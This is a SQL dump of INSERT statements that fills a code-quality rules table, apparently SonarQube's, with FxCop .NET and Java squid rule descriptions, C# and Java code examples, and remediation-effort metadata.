INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (651, 'CA1302: Do not hardcode locale specific strings', 'DoNotHardcodeLocaleSpecificStrings', 'CA1302', 'fxcop', '<h2>Cause</h2>
<p>
            A method uses a string literal that represents part of the path of certain system folders.
</p>
<h2>Rule Description</h2>
<p>
            The <code>System.Environment.SpecialFolder</code> enumeration contains members that refer to special system folders. The locations of these folders can have different values on different operating systems, the user can change some of the locations, and the locations are localized. An example of a special folder is the System folder, which is "C:\WINDOWS\system32" on Windows XP but "C:\WINNT\system32" on Windows 2000. The <code>Environment.GetFolderPath</code> method returns the locations that are associated with the <code>Environment.SpecialFolder</code> enumeration. The locations that are returned by <code>GetFolderPath</code> are localized and appropriate for the currently running computer.
            This rule tokenizes the folder paths that are retrieved by using the <code>GetFolderPath</code> method into separate directory levels. Each string literal is compared to the tokens. If a match is found, it is assumed that the method is building a string that refers to the system location that is associated with the token. For portability and localizability, use the <code>GetFolderPath</code> method to retrieve the locations of the special system folders instead of using string literals.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, retrieve the location by using the <code>GetFolderPath</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the string literal is not used to refer to one of the system locations that is associated with the <code>Environment.SpecialFolder</code> enumeration.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotPassLiteralsAsLocalizedParameters}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182186.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182186.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812613, 1510817812614, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (649, 'CA1407: Avoid static members in COM visible types', 'AvoidStaticMembersInComVisibleTypes', 'CA1407', 'fxcop', '<h2>Cause</h2>
<p>
            A type that is specifically marked as visible to Component Object Model (COM) contains a <code>public</code> <code>static</code> method.
</p>
<h2>Rule Description</h2>
<p>
            COM does not support <code>static</code> methods.
            This rule ignores property and event accessors, operator overloading methods, or methods that are marked by using either the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> attribute or the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute.
            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types.
            For this rule to occur, an assembly-level <code>ComVisibleAttribute</code> must be set to <code>false</code> and the class- <code>ComVisibleAttribute</code> must be set to <code>true</code>, as the following code shows.









            <pre>
using System;
using System.Runtime.InteropServices;

[assembly: ComVisible(false)]
namespace Samples
{
    [ComVisible(true)]
    public class MyClass
    {
        public static void DoSomething()
        {
        }
    }
}
</pre>











                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if a COM client does not require access to the functionality that is provided by the <code>static</code> method.
</p>
<h2>Example Violation</h2>

<h3>Description</h3>
<p>
                The following example shows a <code>static</code> method that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;

[assembly: ComVisible(false)]

namespace Samples
{
    [ComVisible(true)]
    public class Book
    {
        private Collection&lt;string&gt; _Pages = new Collection&lt;string&gt;();

        public Book()
        {
        }

        public Collection&lt;string&gt; Pages
        {
            get { return _Pages; }
        }

        // Violates this rule         
        public static Book FromPages(string[] pages)
        {
            if (pages == null)
                throw new ArgumentNullException("pages");

            Book book = new Book();

            foreach (string page in pages)
            {
                book.Pages.Add(page);
            }             return book;
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                In this example, the Book.FromPages method cannot be called from COM.
</p>
<h2>Example Fix</h2>

<h3>Description</h3>
<p>
                To fix the violation in the previous example, you could change the method to an instance method, but that does not make sense in this instance. A better solution is to explicitly apply ComVisible(false) to the method to make it clear to other developers that the method cannot be seen from COM.
                The following example applies <code>ComRegisterFunctionAttribute</code> to the method.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;

[assembly: ComVisible(false)]

namespace Samples
{
    [ComVisible(true)]
    public class Book
    {
        private Collection&lt;string&gt; _Pages = new Collection&lt;string&gt;();

        public Book()
        {
        }

        public Collection&lt;string&gt; Pages
        {
            get { return _Pages; }
        }

        [ComVisible(false)]
        public static Book FromPages(string[] pages)
        {
            if (pages == null)
                throw new ArgumentNullException("pages");

            Book book = new Book();

            foreach (string page in pages)
            {
                book.Pages.Add(page);
            }

            return book;
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:MarkAssembliesWithComVisible}<br/>




                {rule:fxcop:AvoidInt64ArgumentsForVB6Clients}<br/>




                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182198.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182198.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812610, 1510817812611, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (650, 'CA1720: Identifiers should not contain type names', 'IdentifiersShouldNotContainTypeNames', 'CA1720', 'fxcop', '<h2>Cause</h2>
<p>
            The name of a parameter in an externally visible member contains a data type name.
            -or-
            The name of an externally visible member contains a language-specific data type name.
</p>
<h2>Rule Description</h2>
<p>
            Names of parameters and members are better used to communicate their meaning than to describe their type, which is expected to be provided by development tools. For names of members, if a data type name must be used, use a language-independent name instead of a language-specific one. For example, instead of the C# type name ''int'', use the language-independent data type name, Int32.
            Each discrete token in the name of the parameter or member is checked against the following language-specific data type names, in a case-insensitive manner:
            <ul>
              <li>
                Bool
              </li>
              <li>
                WChar
              </li>
              <li>
                Int8
              </li>
              <li>
                UInt8
              </li>
              <li>
                Short
              </li>
              <li>
                UShort
              </li>
              <li>
                Int
              </li>
              <li>
                UInt
              </li>
              <li>
                Integer
              </li>
              <li>
                UInteger
              </li>
              <li>
                Long
              </li>
              <li>
                ULong
              </li>
              <li>
                Unsigned
              </li>
              <li>
                Signed
              </li>
              <li>
                Float
              </li>
              <li>
                Float32
              </li>
              <li>
                Float64
              </li>
            </ul>
            In addition, the names of a parameter are also checked against the following language-independent data type names, in a case-insensitive manner:
            <ul>
              <li>
                Object
              </li>
              <li>
                Obj
              </li>
              <li>
                Boolean
              </li>
              <li>
                Char
              </li>
              <li>
                String
              </li>
              <li>
                SByte
              </li>
              <li>
                Byte
              </li>
              <li>
                UByte
              </li>
              <li>
                Int16
              </li>
              <li>
                UInt16
              </li>
              <li>
                Int32
              </li>
              <li>
                UInt32
              </li>
              <li>
                Int64
              </li>
              <li>
                UInt64
              </li>
              <li>
                IntPtr
              </li>
              <li>
                Ptr
              </li>
              <li>
                Pointer
              </li>
              <li>
                UInptr
              </li>
              <li>
                UPtr
              </li>
              <li>
                UPointer
              </li>
              <li>
                Single
              </li>
              <li>
                Double
              </li>
              <li>
                Decimal
              </li>
              <li>
                Guid
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>

              If fired against a parameter:

            Replace the data type identifier in the name of the parameter with either a term that better describes its meaning or a more generic term, such as ''value''.

              If fired against a member:

            Replace the language-specific data type identifier in the name of the member with a term that better describes its meaning, a language-independent equivalent, or a more generic term, such as ''value''.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Occasional use of type-based parameter and member names might be appropriate. However, for new development, no known scenarios occur where you should suppress a warning from this rule. For libraries that have previous shipped, you might have to suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>




                {rule:fxcop:IdentifiersShouldNotContainUnderscores}<br/>




                {rule:fxcop:ParameterNamesShouldNotMatchMemberNames}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb531486.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb531486.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812612, 1510817812612, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (728, 'Array designators "[]" should be located after the type in method signatures', 'S1195', NULL, 'squid', '<p>According to the Java Language Specification: </p>
<blockquote>
  <p>For compatibility with older versions of the Java SE platform,</p>
  <p>the declaration of a method that returns an array is allowed to place (some or all of) the empty bracket pairs that form the declaration of the
  array type after the formal parameter list.</p>
  <p>This obsolescent syntax should not be used in new code.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public int getVector()[] { /* ... */ }    // Noncompliant

public int[] getMatrix()[] { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public int[] getVector() { /* ... */ }

public int[][] getMatrix() { /* ... */ }
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812725, 1510817812725, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (741, 'Default EJB interceptors should be declared in "ejb-jar.xml"', 'S3281', NULL, 'squid', '<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated
as default. </p>
<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,
<code>Stateless</code> or <code>Stateful</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
// file: ejb-interceptors.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;&lt;!-- Noncompliant; will not be treated as default --&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// file: ejb-jar.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812740, 1510817812740, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (652, 'CA1809: Avoid excessive locals', 'AvoidExcessiveLocals', 'CA1809', 'fxcop', '<h2>Cause</h2>
<p>
            A member contains more than 64 local variables, some of which might be compiler-generated.
</p>
<h2>Rule Description</h2>
<p>
            A common performance optimization is to store a value in a processor register instead of in memory, which is referred to as enregistering the value. The common language runtime considers up to 64 local variables for enregistration. Variables that are not enregistered are put on the stack and must be moved to a register before manipulation. To allow the chance that all local variables get enregistered, limit the number of local variables to 64.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, refactor the implementation to use no more than 64 local variables.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule, or to disable the rule, if performance is not an issue.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:RemoveUnusedLocals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182263.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182263.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812615, 1510817812615, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (653, 'CA2108: Review declarative security on value types', 'ReviewDeclarativeSecurityOnValueTypes', 'CA2108', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected value type is secured by a <code>Data and Modeling in the .NET Framework</code> or Link Demands.
</p>
<h2>Rule Description</h2>
<p>
            Value types are allocated and initialized by their default constructors before other constructors execute. If a value type is secured by a Demand or LinkDemand, and the caller does not have permissions that satisfy the security check, any constructor other than the default will fail, and a security exception will be thrown. The value type is not deallocated; it is left in the state set by its default constructor. Do not assume that a caller that passes an instance of the value type has permission to create or access the instance.
</p>
<h2>How to Fix Violations</h2>
<p>
            You cannot fix a violation of this rule unless you remove the security check from the type, and use method level security checks in its place. Note that fixing the violation in this manner will not prevent callers with inadequate permissions from obtaining instances of the value type. You must ensure that an instance of the value type, in its default state, does not expose sensitive information, and cannot be used in a harmful manner.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You can suppress a warning from this rule if any caller can obtain instances of the value type in its default state without posing a threat to security.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182307.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182307.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812616, 1510817812616, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (654, 'CA2211: Non-constant fields should not be visible', 'NonConstantFieldsShouldNotBeVisible', 'CA2211', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected static field is not constant nor is it read-only.
</p>
<h2>Rule Description</h2>
<p>
            Static fields that are neither constants nor read-only are not thread-safe. Access to such a field must be carefully controlled and requires advanced programming techniques for synchronizing access to the class object. Because these are difficult skills to learn and master, and testing such an object poses its own challenges, static fields are best used to store data that does not change. This rule applies to libraries; applications should not expose any fields.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the static field constant or read-only. If this is not possible, redesign the type to use an alternative mechanism such as a thread-safe property that manages thread-safe access to the underlying field. Realize that issues such as lock contention and deadlocks might affect the performance and behavior of the library.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if you are developing an application and therefore have full control over access to the type that contains the static field. Library designers should not suppress a warning from this rule; using non-constant static fields can make using the library difficult for developers to use correctly.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182353.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182353.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812617, 1510817812617, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (655, 'CA2232: Mark Windows Forms entry points with STAThread', 'MarkWindowsFormsEntryPointsWithStaThread', 'CA2232', 'fxcop', '<h2>Cause</h2>
<p>
            An assembly references the <code>System.Windows.Forms</code> namespace, and its entry point is not marked with the <code>System.STAThreadAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>


                <code>STAThreadAttribute</code>
               indicates that the COM threading model for the application is single-threaded apartment. This attribute must be present on the entry point of any application that uses Windows Forms; if it is omitted, the Windows components might not work correctly. If the attribute is not present, the application uses the multithreaded apartment model, which is not supported for Windows Forms.





                    Note




                     Visual Basic projects that use the Application Framework do not have to mark the Main method with STAThread. The Visual Basic compiler does it automatically.




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the <code>STAThreadAttribute</code> attribute to the entry point. If the <code>System.MTAThreadAttribute</code> attribute is present, remove it.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if you are developing for the .NET Compact Framework, for which the <code>STAThreadAttribute</code> attribute is unnecessary and not supported.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182351.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182351.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812618, 1510817812619, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (656, 'CA1023: Indexers should not be multidimensional', 'IndexersShouldNotBeMultidimensional', 'CA1023', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type contains a public or protected indexer that uses more than one index.
</p>
<h2>Rule Description</h2>
<p>
            Indexers, that is, indexed properties, should use a single index. Multi-dimensional indexers can significantly reduce the usability of the library. If the design requires multiple indexes, reconsider whether the type represents a logical data store. If not, use a method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the design to use a lone integer or string index, or use a method instead of the indexer.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only after carefully considering the need for the nonstandard indexer.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:UseIntegralOrStringArgumentForIndexers}<br/>




                {rule:fxcop:UsePropertiesWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182152.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182152.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812620, 1510817812620, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (657, 'CA1027: Mark enums with FlagsAttribute', 'MarkEnumsWithFlags', 'CA1027', 'fxcop', '<h2>Cause</h2>
<p>
            The values of a public enumeration are powers of two or are combinations of other values that are defined in the enumeration, and the <code>System.FlagsAttribute</code> attribute is not present. To reduce false positives, this rule does not report a violation for enumerations that have contiguous values.
</p>
<h2>Rule Description</h2>
<p>
            An enumeration is a value type that defines a set of related named constants. Apply <code>FlagsAttribute</code> to an enumeration when its named constants can be meaningfully combined. For example, consider an enumeration of the days of the week in an application that keeps track of which day''s resources are available. If the availability of each resource is encoded by using the enumeration that has <code>FlagsAttribute</code> present, any combination of days can be represented. Without the attribute, only one day of the week can be represented.
            For fields that store combinable enumerations, the individual enumeration values are treated as groups of bits in the field. Therefore, such fields are sometimes referred to as bit fields. To combine enumeration values for storage in a bit field, use the Boolean conditional operators. To test a bit field to determine whether a specific enumeration value is present, use the Boolean logical operators. For a bit field to store and retrieve combined enumeration values correctly, each value that is defined in the enumeration must be a power of two. Unless this is so, the Boolean logical operators will not be able to extract the individual enumeration values that are stored in the field.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add <code>FlagsAttribute</code> to the enumeration.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if you do not want the enumeration values to be combinable.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotMarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182159.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182159.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812621, 1510817812621, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (658, 'CA1402: Avoid overloads in COM visible interfaces', 'AvoidOverloadsInComVisibleInterfaces', 'CA1402', 'fxcop', '<h2>Cause</h2>
<p>
            A Component Object Model (COM) visible interface declares overloaded methods.
</p>
<h2>Rule Description</h2>
<p>
            When overloaded methods are exposed to COM clients, only the first method overload retains its name. Subsequent overloads are uniquely renamed by appending to the name an underscore character ''_'' and an integer that corresponds to the order of declaration of the overload. For example, consider the following methods.









            <pre>
   void SomeMethod(int valueOne);
   void SomeMethod(int valueOne, int valueTwo, int valueThree);
   void SomeMethod(int valueOne, int valueTwo);
</pre>




These methods are exposed to COM clients as the following.









            <pre>
   void SomeMethod(int valueOne);
   void SomeMethod_2(int valueOne, int valueTwo, int valueThree);
   void SomeMethod_3(int valueOne, int valueTwo);
</pre>




Visual Basic 6 COM clients cannot implement interface methods by using an underscore in the name.






                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}<br/>




                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>




                {rule:fxcop:MarkAssembliesWithComVisible}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182197.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182197.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812622, 1510817812623, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (659, 'CA2132: Default constructors must be at least as critical as base type default constructors', 'DefaultConstructorsMustHaveConsistentTransparency', 'CA2132', 'fxcop', '<h2>Cause</h2>
<p>
            The transparency attribute of the default constructor of a derived class is not as critical as the transparency of the base class.
</p>
<h2>Rule Description</h2>
<p>
            Types and members that have the <code>SecurityCriticalAttribute</code> cannot be used by Silverlight application code. Security-critical types and members can be used only by trusted code in the .NET Framework for Silverlight class library. Because a public or protected construction in a derived class must have the same or greater transparency than its base class, a class in an application cannot be derived from a class marked SecurityCritical.
            For CoreCLR platform code, if a base type has a public or protected non-transparent default constructor then the derived type must obey the default constructor inheritance rules. The derived type must also have a default constructor and that constructor must be at least as critical default constructor of the base type.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix the violation, remove the type or do not derive from security non-transparent type.
</p>
<h2>When to Suppress Warnings</h2>

<h3>Code</h3>
<p>










            <pre>
using System;
using System.Security;

namespace TransparencyWarningsDemo
{

    public class BaseWithSafeCriticalDefaultCtor
    {
        [SecuritySafeCritical]
        public BaseWithSafeCriticalDefaultCtor() { }
    }

    public class DerivedWithNoDefaultCtor : BaseWithSafeCriticalDefaultCtor
    {
        // CA2132 violation - since the base has a public or protected non-transparent default .ctor, the 
        // derived type must also have a default .ctor
    }

    public class DerivedWithTransparentDefaultCtor : BaseWithSafeCriticalDefaultCtor
    {
        // CA2132 violation - since the base has a safe critical default .ctor, the derived type must have 
        // either a safe critical or critical default .ctor.  This is fixed by making this .ctor safe critical 
        // (however, user code cannot be safe critical, so this fix is platform code only).
        DerivedWithTransparentDefaultCtor() { }
    }

    public class BaseWithCriticalCtor
    {
        [SecurityCritical]
        public BaseWithCriticalCtor() { }
    }

    public class DerivedWithSafeCriticalDefaultCtor : BaseWithSafeCriticalDefaultCtor
    {
        // CA2132 violation - since the base has a critical default .ctor, the derived must also have a critical 
        // default .ctor.  This is fixed by making this .ctor critical, which is not available to user code
        [SecuritySafeCritical]
        public DerivedWithSafeCriticalDefaultCtor() { }
    }
}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd983956.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd983956.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812623, 1510817812624, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (660, 'CA2230: Use params for variable arguments', 'UseParamsForVariableArguments', 'CA2230', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type contains a public or protected method that uses the <code>VarArgs</code> calling convention.
</p>
<h2>Rule Description</h2>
<p>
            The <code>VarArgs</code> calling convention is used with certain method definitions that take a variable number of parameters. A method using the <code>VarArgs</code> calling convention is not Common Language Specification (CLS) compliant and might not be accessible across programming languages.
            In C#, the <code>VarArgs</code> calling convention is used when a method''s parameter list ends with the <code>__arglist</code> keyword. Visual Basic does not support the <code>VarArgs</code> calling convention, and Visual C++  allows its use only in unmanaged code that uses the ellipse <code>...</code> notation.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule in C#, use the params (C# Reference) keyword instead of <code>__arglist</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182366.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182366.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812625, 1510817812625, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (733, 'Array designators "[]" should be on the type, not the variable', 'S1197', NULL, 'squid', '<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][];   // Noncompliant
int[] matrix[];   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int[][] matrix;   // Compliant
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812730, 1510817812731, 1);
